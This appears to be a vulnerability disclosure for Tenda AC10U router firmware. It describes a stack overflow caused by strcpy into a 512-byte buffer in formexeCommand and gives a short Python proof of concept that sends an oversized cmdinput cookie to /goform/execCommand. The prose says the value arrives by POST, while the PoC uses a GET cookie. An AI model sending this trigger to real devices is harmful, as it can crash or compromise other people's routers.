## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3795.html

## Affected version

AC10U v1.0 Firmware V15.03.06.49

## Vulnerability details

The Tenda AC10U v1.0 Firmware V15.03.06.49 firmware has a stack overflow vulnerability in the `formexeCommand` function. The `str` variable receives the `cmdinput` parameter from a POST request and is later assigned to the `cmd_buf` variable, which is fixed at 512 bytes. However, since the user can control the input of `cmdinput`, the statement `strcpy(cmd_buf, str);` can cause a buffer overflow. The user-provided `cmdinput` can exceed the capacity of the `cmd_buf` array, triggering this security vulnerability.

![image-20240313105309583](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313105309583.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://%s/goform/execCommand"%ip
cookie = {"Cookie":"cmdinput=" + "A"*1000}
ret = requests.get(url=url,cookies=cookie)
print(ret.text)
```

![image-20240313105727084](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313105727084.png)
